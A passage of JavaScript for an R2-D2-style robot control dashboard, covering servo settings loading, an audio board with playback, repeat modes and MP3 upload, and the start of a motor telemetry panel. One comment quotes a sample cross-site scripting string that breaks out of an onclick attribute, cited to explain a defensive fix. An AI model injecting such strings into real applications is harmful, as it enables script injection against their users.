  const bodyHats = _servoCfg.body_hats?.length
    ? _servoCfg.body_hats
    : [{ hat: 1, addr: '0x41', servos: Array.from({length:16}, (_, i) => `Servo_S${i}`) }];
  _renderHatBlocks(el('dome-servo-hats'), domeHats, 'dome', 'dome');
  _renderHatBlocks(el('body-servo-hats'), bodyHats, 'body', 'body');
}

// B5 + E1 fix 2026-05-16: in-flight guard + optimistic concurrency
// version token. Multiple callers (switchTab→loadSettings, switch
// SettingsPanel→servos, _applyLocationLabels poll) used to fire
// loadServoSettings simultaneously → double renderCalibration() with
// replaceChildren() destroying mid-typed inputs. Now: coalesce concurrent
// calls + capture If-Match version header for save-side conflict check.
let _loadServoInFlight = null;
let _servoCfgVersion = null;   // X-Servo-Version header from last GET

async function loadServoSettings() {
  if (_loadServoInFlight) return _loadServoInFlight;
  _loadServoInFlight = (async () => {
    try {
      // Need raw fetch to read X-Servo-Version header (api() helper
      // returns body only). Reuses adminGuard token attachment.
      const base = (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';
      const headers = {};
      if (typeof adminGuard !== 'undefined') {
        const tok = adminGuard.getToken && adminGuard.getToken();
        if (tok) headers['X-Admin-Pw'] = tok;
      }
      const res = await fetch(base + '/servo/settings', { headers }).catch(() => null);
      if (!res || !res.ok) return;
      const data = await res.json().catch(() => null);
      if (!data) return;
      _servoCfg = data;
      _servoCfgVersion = res.headers.get('X-Servo-Version') || null;
      // B4 fix: do NOT call renderCalibration if grid already populated
      // (replaceChildren destroys mid-typed inputs across all HATs).
      // Only re-render if HAT layout changed (count/addresses), else
      // updateInputs is enough.
      const layoutKey = JSON.stringify([
        (_servoCfg.dome_hats || []).map(h => h.addr),
        (_servoCfg.body_hats || []).map(h => h.addr),
      ]);
      if (_lastHatLayout !== layoutKey) {
        _lastHatLayout = layoutKey;
        renderCalibration();
      }
      // updateInputs() preserves user's dirty edits — see _dirtyFields.
      Object.values(_hatPanels).forEach(p => p.updateInputs());
    } finally {
      _loadServoInFlight = null;
    }
  })();
  return _loadServoInFlight;
}
let _lastHatLayout = '';

function updateServoDurationPreview() {
  const ms90 = parseInt(el('servo-ms90')?.value ?? 150);
  if (isNaN(ms90)) return;
  const dur  = Math.max(50, Math.round(70 / 90 * ms90));
  const prev = el('servo-duration-preview');
  if (prev) prev.textContent = `Example 70° = ${dur} ms`;
}

async function testServoSettings(dir) {
  const endpoint = dir === 'open' ? '/servo/dome/open' : '/servo/dome/close';
  const data = await api(endpoint, 'POST', { name: 'Servo_M0' });
  if (data) toast(`Test Servo_M0 ${dir.toUpperCase()}`, 'ok');
}

// Initial render with default 1-HAT layout (replaced after loadServoSettings resolves)
renderCalibration();

// ================================================================
// Audio Board
// ================================================================

class AudioBoard {
  constructor() {
    this._currentCat    = null;
    this._selectEpoch   = 0;   // F-18: monotonic counter for selectCategory races
    this._playing       = false;
    this._tickInterval  = null;
    this._timedSound    = '';
    this._startTime     = 0;
    this._totalMs       = 0;
    // F-3: persist repeat / auto-random in localStorage so a page reload
    // doesn't surprise the operator by silently dropping their preference
    // mid-playback. Per-client (each tablet/browser has its own state).
    this._LS_KEY = 'astromech-audio-modes';
    const saved = this._loadModes();
    this._repeat        = !!saved.repeat;
    this._autoRandom    = !!saved.autoRandom;
    // F-5: capture the SPECIFIC sound name the user was hearing when they
    // toggled repeat. Without this, a multi-client scenario (another
    // tablet plays a different sound mid-repeat-cycle) caused the
    // repeat-on-end to replay the OTHER client's sound — _timedSound
    // tracked the latest sound regardless of source.
    this._repeatTarget  = null;
    this._userStopped   = false;
    this._lastRandomCat = null;
    this._fullIndex     = {};
    this._ICONS = {
      alarm:'🚨', happy:'😄', hum:'🎵', misc:'🎲', proc:'⚙️', quote:'💬',
      razz:'🤪', sad:'😢', ooh:'😲', whistle:'🎶', scream:'😱',
      special:'⭐', sent:'🗣️',   // removed duplicate `sent:'🤔'` — the
                                   // 🤔 was dead code, last write wins
    };
    this._CAT_COLORS = {
      alarm:'#ff2244',  happy:'#ffcc00',  hum:'#00aaff',  misc:'#aa44ff',
      proc:'#00ffea',   quote:'#ff8800',  razz:'#ff44cc',  sad:'#4499ff',
      sent:'#00cc66',   ooh:'#ff6600',    whistle:'#44ffbb', scream:'#ff0055',
      special:'#ffaa00'
    };
    // Noms d'affichage propres pour chaque catégorie
    this._CAT_LABELS = {
      alarm:'Alarm',    happy:'Happy',    hum:'Hum',       misc:'Misc',
      proc:'Process',   quote:'Quote',    razz:'Razz',     sad:'Sad',
      sent:'Sentiment', ooh:'Ooh',        whistle:'Whistle', scream:'Scream',
      special:'Special'
    };
  }

  // Formate un nom de fichier pour l'affichage — show full filename
  _formatSound(filename) {
    return filename;
  }

  async loadCategories() {
    el('now-playing-repeat')?.classList.toggle('active', this._repeat);
    el('now-playing-auto')?.classList.toggle('active', this._autoRandom);

    // P2 fix 2026-05-16: drop the parallel /audio/categories fetch —
    // /audio/index already returns the same category names + we can
    // derive counts client-side from each value's length. Saves one
    // Flask roundtrip per loadCategories() call (~4 call sites).
    const indexData = await api('/audio/index');
    if (!indexData?.categories) return;
    this._fullIndex = indexData.categories;
    this._sound2cat = null;   // F-11: invalidate reverse-index cache

    const wrap = el('audio-categories');
    if (!wrap) return;
    const cats = Object.entries(this._fullIndex).map(
      ([name, sounds]) => ({ name, count: Array.isArray(sounds) ? sounds.length : 0 })
    );

    // F-1 + F-2 fix: build DOM with createElement instead of innerHTML +
    // inline onclick. The category name comes from the server-side index
    // file which the admin can write to via /audio/category/create — a
    // future regex change there could otherwise let a name like
    // `x'); alert(1); //` break out of the onclick attribute. createElement
    // + .dataset + addEventListener never parses the value as HTML or JS
    // so the XSS vector is structurally impossible.
    wrap.replaceChildren();   // clear any previous content
    cats.forEach(({ name, count }) => {
      const color = this._CAT_COLORS[name] || '#00aaff';
      const label = this._CAT_LABELS[name] || name.charAt(0).toUpperCase() + name.slice(1);
      const icon  = this._ICONS[name] || '🔊';

      const div = document.createElement('div');
      div.className   = 'category-pill';
      div.id          = `cat-pill-${name}`;   // safe: regex-gated server-side
      div.dataset.cat = name;
      div.style.setProperty('--cat-color', color);
      // .textContent on these spans escapes automatically — no XSS surface.
      const iconEl  = document.createElement('span');
      iconEl.className  = 'cat-icon';
      iconEl.textContent = icon;
      const labelEl = document.createElement('span');
      labelEl.className  = 'cat-label';
      labelEl.textContent = label;
      const countEl = document.createElement('span');
      countEl.className  = 'cat-count';
      countEl.textContent = count;
      div.append(iconEl, labelEl, countEl);
      wrap.appendChild(div);
    });

    // Single delegated click handler on the wrap — idempotent via a flag
    // so we don't stack listeners on every loadCategories() call.
    if (!wrap.dataset.wired) {
      wrap.addEventListener('click', e => {
        const pill = e.target.closest('.category-pill[data-cat]');
        if (pill) this.selectCategory(pill.dataset.cat);
      });
      wrap.dataset.wired = '1';
    }

    // Sélectionner la première catégorie par défaut
    if (cats.length > 0) this.selectCategory(cats[0].name);
    this.showUploadZone(adminGuard?.unlocked === true);
  }

  async selectCategory(cat) {
    // F-18: epoch token. Rapid double-click on two different category
    // pills can race: fetch A in flight, click B → fetch B in flight, A
    // resolves first → grid fills with A while pill B is active. Bump
    // the epoch on entry, compare on resolve, bail if stale.
    const epoch = ++this._selectEpoch;
    this._currentCat = cat;

    // Marquer la pill active
    document.querySelectorAll('.category-pill').forEach(p => p.classList.remove('active'));
    const pill = el(`cat-pill-${cat}`);
    if (pill) {
      pill.classList.add('active');
      pill.scrollIntoView({ behavior: 'smooth', block: 'nearest', inline: 'center' });
    }

    // Mettre à jour le titre de la section sons
    const label = this._CAT_LABELS[cat] || cat.toUpperCase();
    const color = this._CAT_COLORS[cat] || '#00aaff';
    const nameEl = el('audio-cat-name');
    if (nameEl) {
      nameEl.textContent = label;
      nameEl.style.color  = color;
    }

    // Afficher le spinner pendant le chargement
    const grid = el('audio-sounds-grid');
    if (!grid) return;
    grid.innerHTML = '<div class="sounds-loading">Loading...</div>';
    this.showUploadZone(adminGuard?.unlocked === true);

    const data = await api(`/audio/sounds?category=${cat}`);
    // F-18: bail if user clicked another category while this fetch was
    // in flight — would otherwise overwrite the more-recent selection.
    if (epoch !== this._selectEpoch) return;

    // F-1 fix: build sound buttons via createElement + dataset so a sound
    // name containing ' or < cannot break out of an inline onclick or
    // attribute. escapeHtml didn't cover ' which would have terminated
    // the JS string literal `onclick="audioBoard.play('...')"`. Single
    // delegated click handler on the grid handles play + random.
    grid.replaceChildren();

    const mkRandomBtn = () => {
      const btn = document.createElement('button');
      btn.className = 'sound-btn sound-btn-random';
      btn.dataset.random = cat;
      btn.title = `Random sound from ${label}`;
      btn.textContent = data && data.sounds && data.sounds.length > 0
        ? '🎲 RANDOM'
        : `🎲 RANDOM ${label}`;
      return btn;
    };

    grid.appendChild(mkRandomBtn());

    if (data && data.sounds && data.sounds.length > 0) {
      // WOW polish 2026-05-15: highlight the last sound the operator
      // played (persisted in localStorage). Helps re-trigger quickly.
      let lastSound = null;
      lastSound = _lsGet('astromech-last-sound');
      const isAdmin = adminGuard.unlocked;
      data.sounds.forEach(s => {
        const btn = document.createElement('button');
        btn.className = 'sound-btn sound-card' + (s === lastSound ? ' last-played' : '');
        btn.dataset.sound = s;
        // L3-W feature 2026-05-16: long-press hint for admin (delete)
        btn.title = (s === lastSound ? `${s} (last played)` : s)
                  + (isAdmin ? ' · long-press to delete' : '');
        btn.textContent = this._formatSound(s);
        // L3-W: long-press 700ms → confirm + delete (admin only).
        // Normal tap still fires play. Suppress click if long-press
        // triggered via capture-phase stopImmediatePropagation.
        if (isAdmin) {
          let _lpTimer = null;
          let _lpFired = false;
          const startLp = () => {
            _lpFired = false;
            _lpTimer = setTimeout(() => {
              _lpFired = true;
              this._confirmDeleteSound(s);
            }, 700);
          };
          const cancelLp = () => {
            if (_lpTimer) { clearTimeout(_lpTimer); _lpTimer = null; }
          };
          btn.addEventListener('pointerdown', startLp);
          btn.addEventListener('pointerup', cancelLp);
          btn.addEventListener('pointerleave', cancelLp);
          btn.addEventListener('click', (e) => {
            if (_lpFired) { e.stopImmediatePropagation(); _lpFired = false; }
          }, true);
        }
        grid.appendChild(btn);
      });
    } else {
      // WOW H2 fix 2026-05-15: empty category guidance instead of just
      // showing the RANDOM button alone (which is useless on empty
      // category anyway — it would 409). Operator with a fresh
      // category sees what to do.
      const isAdmin = adminGuard.unlocked;
      const empty = document.createElement('div');
      empty.className = 'audio-empty';
      empty.style.gridColumn = '1 / -1';
      empty.innerHTML = '';
      const icon = document.createElement('div');
      icon.style.fontSize = '36px';
      icon.style.opacity = '0.4';
      icon.textContent = '📁';
      const title = document.createElement('div');
      title.style.cssText = 'font-size:12px;letter-spacing:2px;margin-top:8px;color:var(--text)';
      title.textContent = `${label.toUpperCase()} — NO SOUNDS YET`;
      const sub = document.createElement('div');
      sub.style.cssText = 'font-size:10px;letter-spacing:1px;margin-top:6px;opacity:0.7';
      sub.textContent = isAdmin
        ? 'Drop MP3 files in the upload zone below ⬇'
        : 'Ask an admin to add sounds.';
      empty.append(icon, title, sub);
      grid.appendChild(empty);
    }

    // Delegated click handler — idempotent (wired once per page lifetime).
    if (!grid.dataset.wired) {
      grid.addEventListener('click', e => {
        const btn = e.target.closest('button[data-sound], button[data-random]');
        if (!btn) return;
        if (btn.dataset.sound)  this.play(btn.dataset.sound);
        if (btn.dataset.random) this.playRandom(btn.dataset.random);
      });
      grid.dataset.wired = '1';
    }
  }

  play(sound) {
    // WOW polish 2026-05-15: visual loading state on the clicked card
    // during the ~500ms mpg123 cold-start. Without this, operator
    // clicks a sound, ~500ms of "nothing visible happens", then
    // playing UI appears. Now: card pulses immediately on click,
    // pulse stops when server confirms ok.
    const card = document.querySelector(`[data-sound="${CSS.escape(sound)}"]`);
    if (card) card.classList.add('sound-loading');
    api('/audio/play', 'POST', { sound }).then(d => {
      if (card) card.classList.remove('sound-loading');
      if (d && d.status === 'ok') {
        this.setPlaying(true, sound);
        // WOW polish: persist last-played for visual marker on next render.
        _lsSet('astromech-last-sound', sound);
        if (card) {
          // Clear any previous last-played markers, mark this one.
          document.querySelectorAll('.sound-card.last-played')
            .forEach(c => c.classList.remove('last-played'));
          card.classList.add('last-played');
        }
      }
    });
  }

  async _confirmDeleteSound(sound) {
    // L3-W feature 2026-05-16: admin long-press → confirm + delete.
    // Browser confirm is acceptable for destructive admin actions —
    // it's modal and unmissable. The toast pattern is for non-blocking
    // info; here we WANT to block.
    if (!confirm(`Delete sound "${sound}"?\n\nThis removes it from:\n  - the audio library\n  - any shortcut targeting it (becomes "none")\n\nChoreo blocks that reference it are preserved — re-upload the same name to restore.`)) {
      return;
    }
    try {
      const base = (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';
      const headers = {};
      const tok = (typeof adminGuard !== 'undefined' && adminGuard.getToken && adminGuard.getToken()) || '';
      if (tok) headers['X-Admin-Pw'] = tok;
      const res = await fetch(base + '/audio/sound/' + encodeURIComponent(sound), {
        method: 'DELETE',
        headers,
      });
      const d = await res.json().catch(() => null);
      if (res.ok && d && d.ok) {
        let msg = `✓ Deleted ${sound}`;
        if (d.shortcuts_neutralized > 0) {
          msg += ` (${d.shortcuts_neutralized} shortcut${d.shortcuts_neutralized > 1 ? 's' : ''} neutralized)`;
        }
        toast(msg, 'ok');
        await this.loadCategories();
        await this.selectCategory(this._currentCat);
        // Refresh global _audioIndex used by choreo editor too
        try {
          const r = await api('/audio/index');
          if (r && r.categories && typeof _audioIndex !== 'undefined') {
            _audioIndex = r.categories;
          }
        } catch {}
      } else {
        toast(`Delete failed: ${(d && d.error) || 'HTTP ' + res.status}`, 'error');
      }
    } catch (e) {
      toast(`Delete network error: ${e.message || e}`, 'error');
    }
  }

  playRandom(cat) {
    const c = cat || this._currentCat || 'happy';
    this._lastRandomCat = c;
    // E5 fix 2026-05-15: if a sound is currently playing, surface a
    // toast so operator knows the previous sound was interrupted
    // (multichannel system but the WEB API addresses channel 0 only).
    if (this._playing && this._timedSound) {
      toast(`Interrupted ${this._timedSound}`, 'info');
    }
    // WOW M4-W fix 2026-05-15: pulse the RANDOM button during the
    // ~500ms cold-start, parity with per-sound buttons. Operator gets
    // the same 'click registered' feedback regardless of trigger path.
    const randomBtn = document.querySelector(`.sound-btn-random[data-random="${CSS.escape(c)}"]`);
    if (randomBtn) randomBtn.classList.add('sound-loading');
    api('/audio/random', 'POST', { category: c }).then(d => {
      if (randomBtn) randomBtn.classList.remove('sound-loading');
      if (d && d.status === 'ok') {
        const label = this._CAT_LABELS[c] || c;
        this.setPlaying(true, `🎲 ${label}`);
      }
    });
  }

  toggleRepeat() {
    this._repeat = !this._repeat;
    if (this._repeat) {
      this._autoRandom = false;
      // F-5: snapshot the CURRENT sound at the moment Repeat was enabled.
      // setPlaying(false) on track-end will replay THIS sound regardless
      // of what _timedSound has become in the meantime (another client,
      // background poll, etc.).
      this._repeatTarget = this._timedSound || this._lastRandomCat || null;
      // WOW M3-W fix 2026-05-15: toast feedback so operator knows the
      // toggle did something, especially when armed BEFORE any play
      // (target captured at next play).
      if (this._repeatTarget) {
        toast(`🔁 Repeat ON — will loop ${this._repeatTarget}`, 'info');
      } else {
        toast('🔁 Repeat armed — next sound will loop', 'info');
      }
    } else {
      this._repeatTarget = null;
      toast('🔁 Repeat OFF', 'info');
    }
    this._saveModes();
    el('now-playing-repeat')?.classList.toggle('active', this._repeat);
    el('now-playing-auto')?.classList.toggle('active', this._autoRandom);
  }

  toggleAutoRandom() {
    this._autoRandom = !this._autoRandom;
    if (this._autoRandom) {
      this._repeat = false;
      this._repeatTarget = null;
    }
    this._saveModes();
    el('now-playing-repeat')?.classList.toggle('active', this._repeat);
    el('now-playing-auto')?.classList.toggle('active', this._autoRandom);
  }

  // F-3 persistence helpers — localStorage round-trip with defensive
  // try/catch in case storage is disabled (private browsing, iframe).
  _loadModes() {
    try {
      const raw = localStorage.getItem(this._LS_KEY);
      return raw ? JSON.parse(raw) : {};
    } catch { return {}; }
  }

  _saveModes() {
    try {
      localStorage.setItem(this._LS_KEY, JSON.stringify({
        repeat: this._repeat, autoRandom: this._autoRandom,
      }));
    } catch {}
  }

  playNext() {
    this.playRandom(this._currentCat || 'happy');
  }

  stopPlayback() {
    this._userStopped = true;
    api('/audio/stop', 'POST').then(d => {
      if (d) this.setPlaying(false);
    });
  }

  _getCatForSound(sound) {
    // F-11: lazy-built reverse index. Old code did O(N×M) scan on every
    // /status poll (every 2s) — fine for 317 sounds but wasteful. Map
    // built once per loadCategories() call (and invalidated by setting
    // _sound2cat = null in loadCategories).
    if (!this._sound2cat) {
      this._sound2cat = new Map();
      for (const [cat, sounds] of Object.entries(this._fullIndex || {})) {
        for (const s of sounds) this._sound2cat.set(s, cat);
      }
    }
    return this._sound2cat.get(sound) || null;
  }

  _fmtTime(ms) {
    const s = Math.max(0, Math.floor(ms / 1000));
    return `${Math.floor(s / 60)}:${String(s % 60).padStart(2, '0')}`;
  }

  _stopTimer() {
    if (this._tickInterval) { clearInterval(this._tickInterval); this._tickInterval = null; }
    const timeEl = el('now-playing-time');
    if (timeEl) timeEl.textContent = '';
    const fill = el('now-playing-progress-fill');
    if (fill) fill.style.width = '0%';
    this._timedSound = '';
    this._totalMs = 0;
  }

  _startTimer(sound) {
    this._stopTimer();
    this._startTime = Date.now();
    this._timedSound = sound;
    this._totalMs = 0;

    // F-13: abort the PREVIOUS metadata-fetch before starting a new one.
    // Rapid clicks (e.g. browsing sounds) used to fire 50+ parallel
    // <audio> elements, each downloading Content-Length bytes via range
    // request — wasteful and slow on the Pi network. Now we keep a single
    // _metadataAudio reference and clear it before reuse.
    if (this._metadataAudio) {
      try {
        this._metadataAudio.removeAttribute('src');
        this._metadataAudio.load();   // forces the browser to abort the request
      } catch {}
      this._metadataAudio = null;
    }

    // Fetch real MP3 duration via Audio element (specific files only, not RANDOM).
    // encodeURIComponent in case a future name allows URL-special chars.
    if (sound && !sound.startsWith('🎲')) {
      const a = new Audio(`/audio/file/${encodeURIComponent(sound)}`);
      this._metadataAudio = a;
      a.addEventListener('loadedmetadata', () => {
        if (this._timedSound === sound && isFinite(a.duration))
          this._totalMs = a.duration * 1000;
      }, { once: true });
      a.addEventListener('error', () => {}, { once: true });   // F-13: silence 404 noise
      a.preload = 'metadata';
      a.load();
    }

    const timeEl = el('now-playing-time');
    const fill = el('now-playing-progress-fill');
    this._tickInterval = setInterval(() => {
      const elapsedMs = Date.now() - this._startTime;
      if (timeEl) {
        const elapsed = this._fmtTime(elapsedMs);
        const total   = this._totalMs > 0 ? this._fmtTime(this._totalMs) : '--:--';
        timeEl.textContent = `${elapsed} / ${total}`;
      }
      if (fill && this._totalMs > 0) {
        // F-12: duration known → switch from indeterminate sliding bar
        // to actual progress, and remove the animation class.
        if (fill.classList.contains('indeterminate')) {
          fill.classList.remove('indeterminate');
          fill.style.transform = '';
        }
        fill.style.width = `${Math.min(100, (elapsedMs / this._totalMs) * 100)}%`;
      }
    }, 500);
  }

  setPlaying(active, name = '') {
    const wasPlaying = this._playing;
    const sameSong   = name && name === this._timedSound;
    this._playing = active;
    const waveform = el('waveform');
    const text     = el('now-playing-text');
    if (waveform) waveform.classList.toggle('playing', active);

    // WOW H1 fix 2026-05-15: visually highlight the playing card in
    // the grid, not just the bottom now-playing bar. Operator's eyes
    // are on the grid when they just clicked; the bottom bar is a
    // glance-second confirmation. Cyan pulse border + class on the
    // matching .sound-btn[data-sound="name"]. Cleared from siblings
    // so only one card is lit at a time.
    document.querySelectorAll('.sound-btn.playing').forEach(b =>
      b.classList.remove('playing'));
    if (active && name && !name.startsWith('🎲')) {
      const card = document.querySelector(`.sound-btn[data-sound="${CSS.escape(name)}"]`);
      if (card) card.classList.add('playing');
    }

    // Category badge on specific sounds
    let displayName = active ? name : 'IDLE';
    if (active && name && !name.startsWith('🎲')) {
      const cat = this._getCatForSound(name);
      if (cat) displayName = `${this._ICONS[cat] || '🔊'} ${name}`;
    }
    // WOW M6-W fix 2026-05-16: when idle, show the active category's
    // emoji + READY hint instead of bare 'IDLE'. Gives the
    // now-playing bar a useful visual anchor when nothing's playing
    // (would otherwise be 10% screen of dead space).
    if (!active) {
      const cat = this._currentCat;
      const icon = (cat && this._ICONS[cat]) || '♪';
      const catLabel = (cat && this._CAT_LABELS[cat]) || '';
      displayName = catLabel ? `${icon} READY · ${catLabel}` : '♪ READY';
    }
    if (text) {
      text.textContent = displayName;
      // F-15: long filenames get ellipsized by `now-playing-text` CSS
      // (overflow:hidden; text-overflow:ellipsis). Set title so the user
      // can hover to see the full name.
      text.title = active ? displayName : '';
    }

    // F-12: progress bar — when total duration is unknown (random sound
    // or metadata not yet loaded), show an indeterminate sliding bar
    // instead of the static 0% fill that looks identical to "just
    // started" then jumps abruptly when metadata arrives.
    const fillElForState = el('now-playing-progress-fill');
    if (fillElForState) {
      fillElForState.classList.toggle('indeterminate',
        active && this._totalMs <= 0);
    }

    if (active && (!wasPlaying || !sameSong)) {
      this._startTimer(name);
    } else if (!active) {
      // F-5: use the SNAPSHOT captured at toggleRepeat time, not the
      // live _timedSound (which may have shifted to another client's
      // sound). Falls back to _timedSound for legacy callers who
      // didn't go through toggleRepeat.
      const soundToRepeat = this._repeatTarget || this._timedSound;
      this._stopTimer();
      if (wasPlaying && !this._userStopped) {
        if (this._repeat) {
          setTimeout(() => {
            if (soundToRepeat && !soundToRepeat.startsWith('🎲')) {
              this.play(soundToRepeat);
            } else {
              this.playRandom(this._lastRandomCat || this._currentCat);
            }
          }, 300);
        } else if (this._autoRandom) {
          setTimeout(() => this.playNext(), 300);
        }
      }
      this._userStopped = false;
    }
  }

  // ── Upload ────────────────────────────────────────────────────────
  showUploadZone(show) {
    const zone = el('audio-upload-zone');
    if (zone) zone.style.display = show ? 'block' : 'none';
    const catName = el('audio-upload-cat-name');
    if (catName) {
      const label = this._CAT_LABELS[this._currentCat] || this._currentCat || '?';
      catName.textContent = label.toUpperCase();
    }
    const newCatRow = el('audio-new-cat-row');
    if (newCatRow) newCatRow.style.display = show ? 'flex' : 'none';
  }

  // L5-W fix 2026-05-15: Esc cancel — clears input + hides row.
  cancelCreateCategory() {
    const input = el('audio-new-cat-input');
    if (input) input.value = '';
    const dup = el('audio-new-cat-dup');
    if (dup) dup.style.display = 'none';
    this.toggleNewCatRow(false);
  }

  // L5-W fix 2026-05-15: live duplicate check using the cached
  // category list — no round-trip needed.
  checkDupCategory(raw) {
    const name = (raw || '').trim().toLowerCase().replace(/[^a-z0-9_]/g, '_').replace(/_+/g, '_').replace(/^_|_$/g, '');
    const dup = el('audio-new-cat-dup');
    if (!dup) return;
    if (!name) { dup.style.display = 'none'; return; }
    const exists = (this._fullIndex && this._fullIndex[name] !== undefined);
    dup.style.display = exists ? 'inline' : 'none';
  }

  async createCategory() {
    const input = el('audio-new-cat-input');
    if (!input) return;
    const name = input.value.trim().toLowerCase().replace(/[^a-z0-9_]/g, '_').replace(/_+/g, '_').replace(/^_|_$/g, '');
    if (!name) { this._uploadStatus('Enter a category name', 'error'); return; }
    // F-6: bypass shared api() helper here so we can read the server's
    // error body on 4xx/5xx. api() returns null on non-2xx, which hid
    // the server's actual error message — duplicate-name 409, invalid
    // characters 400 etc. all displayed as the generic "Failed to
    // create category". Now we fetch directly and parse the JSON body
    // regardless of status code.
    try {
      const base = (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';
      const res  = await fetch(base + '/audio/category/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name }),
      });
      const d = await res.json().catch(() => null);
      if (res.ok && d?.ok) {
        input.value = '';
        toast(`Category "${name}" created`, 'ok');
        await this.loadCategories();
        this.selectCategory(name);
      } else {
        this._uploadStatus(d?.error || `HTTP ${res.status}`, 'error');
      }
    } catch (e) {
      this._uploadStatus(`Network error: ${e.message || e}`, 'error');
    }
  }

  uploadDragOver(e) {
    e.preventDefault();
    // WOW polish 2026-05-15: clearer drag-over feedback — green glow,
    // scaled border, "DROP NOW" text replacement. Operator gets
    // unmissable confirmation that yes, dropping here will upload.
    // P5 fix 2026-05-15: dragover fires at 60Hz while hovering, was
    // calling classList.add repeatedly (idempotent at DOM level but
    // triggers a wasted style recalc each time). Guard the add.
    const zone = el('audio-upload-zone');
    if (zone && !zone.classList.contains('drag-active')) {
      zone.classList.add('drag-active');
    }
  }

  uploadDragLeave(e) {
    const zone = el('audio-upload-zone');
    if (zone) zone.classList.remove('drag-active');
  }

  uploadDrop(e) {
    e.preventDefault();
    this.uploadDragLeave(e);
    const files = [...e.dataTransfer.files].filter(f => f.name.toLowerCase().endsWith('.mp3'));
    if (!files.length) { this._uploadStatus('Only .mp3 files accepted', 'error'); return; }
    this.uploadFiles(files);
  }

  async uploadFiles(fileList) {
    const files = [...fileList];
    if (!files.length) return;
    const cat = this._currentCat;
    if (!cat) { this._uploadStatus('Select a category first', 'error'); return; }

    // F-8: client-side gate — fail fast on obviously-bad inputs so the
    // user doesn't wait for the server round-trip to learn that their
    // 200MB file was rejected.
    const MAX_SIZE = 10 * 1024 * 1024;   // 10 MB — typical R2 sound is <500KB
    const skipped = [];   // {name, reason}
    const queued  = [];
    for (const f of files) {
      if (f.size > MAX_SIZE) {
        skipped.push({ name: f.name, reason: `too large (${(f.size/1024/1024).toFixed(1)}MB > 10MB)` });
        continue;
      }
      // f.type can be empty on Windows file drag — accept that case
      // but reject explicit non-audio mime types.
      if (f.type && !f.type.startsWith('audio/')) {
        skipped.push({ name: f.name, reason: `not audio (mime: ${f.type})` });
        continue;
      }
      queued.push(f);
    }

    if (!queued.length) {
      this._uploadStatus(
        `All ${files.length} file(s) rejected — see console`, 'error');
      console.warn('Upload rejected:', skipped);
      return;
    }

    this._uploadStatus(`Uploading ${queued.length} file(s)…`, 'info');
    let ok = 0;
    const renamed = [];
    const failed = [];
    // L4-W fix 2026-05-15: XMLHttpRequest for upload progress events.
    // fetch() doesn't expose progress for the request body (only the
    // response). On a local LAN MP3 upload is 500ms-2s, well above the
    // 300ms threshold from feedback_loading_states.md where progress
    // feedback is justified.
    const uploadOne = (file, idx) => new Promise(resolve => {
      const form = new FormData();
      form.append('file', file);
      form.append('category', cat);
      const xhr = new XMLHttpRequest();
      xhr.open('POST', (window.R2D2_API_BASE || '') + '/audio/upload');
      if (typeof adminGuard !== 'undefined') {
        const tok = adminGuard.getToken && adminGuard.getToken();
        if (tok) xhr.setRequestHeader('X-Admin-Pw', tok);
      }
      xhr.upload.onprogress = (e) => {
        if (e.lengthComputable) {
          const pct = Math.round((e.loaded / e.total) * 100);
          this._uploadStatus(
            `Uploading ${idx + 1}/${queued.length}: ${file.name} — ${pct}%`,
            'info');
        }
      };
      xhr.onload = () => {
        let d = null;
        try { d = JSON.parse(xhr.responseText); } catch {}
        if (xhr.status >= 200 && xhr.status < 300 && d && d.ok) {
          resolve({ ok: true, d });
        } else {
          resolve({ ok: false, reason: (d && d.error) || `HTTP ${xhr.status}` });
        }
      };
      xhr.onerror = () => resolve({ ok: false, reason: 'network error' });
      xhr.send(form);
    });
    for (let i = 0; i < queued.length; i++) {
      const file = queued[i];
      const result = await uploadOne(file, i);
      if (result.ok) {
        ok++;
        if (result.d.renamed) {
          renamed.push({ original: result.d.original, final: result.d.filename });
        }
      } else {
        failed.push({ name: file.name, reason: result.reason });
      }
    }
    if (ok) {
      let msg = `✓ ${ok} file(s) uploaded to ${cat.toUpperCase()}`;
      if (renamed.length) {
        const first = renamed[0];
        const more  = renamed.length > 1 ? ` (+${renamed.length - 1} more)` : '';
        msg += ` — ${renamed.length} renamed: ${first.original} → ${first.final}${more}`;
        console.info('Auto-renamed uploads:', renamed);
      }
      this._uploadStatus(msg, 'ok');
    }
    if (failed.length || skipped.length) {
      // F-7: detailed list goes to console for debugging; the toast +
      // status banner show the count + first-failure reason inline.
      const all = [...skipped, ...failed];
      console.warn('Upload failures:', all);
      const first = all[0];
      const more  = all.length > 1 ? ` (+ ${all.length - 1} more — see console)` : '';
      this._uploadStatus(
        `✗ ${all.length} failed: ${first.name} — ${first.reason}${more}`,
        'error'
      );
    }
    if (ok) {
      await this.selectCategory(cat);   // refresh grid
      // E14 fix 2026-05-15: also refresh the global _audioIndex used
      // by the choreo editor's audio dropdown. Otherwise a sound
      // uploaded mid-session would be invisible to choreo audio
      // blocks until full page reload.
      try {
        const r = await api('/audio/index');
        if (r && r.categories && typeof _audioIndex !== 'undefined') {
          _audioIndex = r.categories;
        }
      } catch {}
    }
  }

  _uploadStatus(msg, type) {
    const s = el('audio-upload-status');
    if (!s) return;
    const colors = { ok: '#00cc66', error: '#ff4444', info: '#00aaff' };
    s.textContent = msg;
    s.style.color = colors[type] || '#aaa';
    s.style.display = 'block';
    if (type !== 'info') setTimeout(() => { s.style.display = 'none'; }, 4000);
  }
}

const audioBoard = new AudioBoard();

function audioStop() {
  audioBoard.stopPlayback();
}

function audioRandom() {
  audioBoard.playRandom(null);
}

// ================================================================
// VESC Panel
// ================================================================

class VescPanel {
  constructor() {
    this._scaleDebounce = null;
    this._lastFault = { L: 0, R: 0 };  // track fault changes for log
    // Session peaks
    this._peaks = { tempL: null, tempR: null, currL: null, currR: null, duty: null, faults: 0 };
    // Invert state
    this._invertL = false;
    this._invertR = false;
    // Fault log entries [{time, side, name}]
    this._faultLog = [];
  }

  // Called by StatusPoller on every refresh
  async refresh() {
    const d = await api('/vesc/telemetry');
    if (!d) return;
    this._updateStatus(d);
    this._updateCard('L', d.L);
    this._updateCard('R', d.R);
    this._updateScale(d.power_scale);
    this._updateSymmetry(d.L, d.R);
    this._updateLastUpdate();
    vescTest.updateTelem(d.L, d.R);
  }

  async loadConfig() {
